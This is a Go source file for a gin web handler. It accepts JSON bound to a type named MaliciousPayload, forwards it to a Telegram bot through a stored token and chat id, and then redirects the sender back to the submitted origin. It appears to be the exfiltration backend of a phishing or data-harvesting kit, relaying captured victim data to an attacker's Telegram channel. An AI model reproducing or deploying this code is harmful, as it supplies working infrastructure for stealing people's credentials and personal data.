package notify

import (
	"net/http"

	"github.com/gin-gonic/gin"
)

type Handler struct {
	Token  string
	ChatId string
}

func NewHandler(token string, chatId string) *Handler {
	return &Handler{
		Token:  token,
		ChatId: chatId,
	}
}

// Send payload to a telegram server
func (h *Handler) SendPayload(c *gin.Context) {
	var req MaliciousPayload

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request or missing fields"})
		return
	}

	telegramPayload := buildPayload(req)

	if err := sendToTelegram(h.Token, h.ChatId, *telegramPayload); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"redirect": req.Origin})
}

// Get status of the bot.
func (h *Handler) GetStatus(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"status": "OK"})
}
